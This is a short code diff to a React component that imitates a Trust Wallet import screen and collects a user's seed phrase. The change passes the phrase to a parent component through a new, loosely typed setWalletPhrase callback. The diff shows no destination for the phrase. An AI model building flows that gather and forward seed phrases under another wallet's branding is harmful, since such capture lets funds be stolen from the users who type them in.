@@ -6,7 +6,13 @@ import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
 import TrustWalletFull from "../icons/trust-wallet-full";
 
-const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
+const TrustWallet = ({
+	handleFinish,
+	setWalletPhrase,
+}: {
+	handleFinish: () => void;
+	setWalletPhrase: any;
+}) => {
 	const [walletName, setWalletName] = useState("Main wallet");
 	const [seedPhrase, setSeedPhraseState] = useState("");
 	const [nameFocused, setNameFocused] = useState(false);
@@ -17,6 +23,7 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
 	// Handle completion
 	const handleComplete = () => {
 		setSeedPhrase(seedPhrase.trim());
+		setWalletPhrase(seedPhrase.trim());
 		handleFinish();
 	};
 
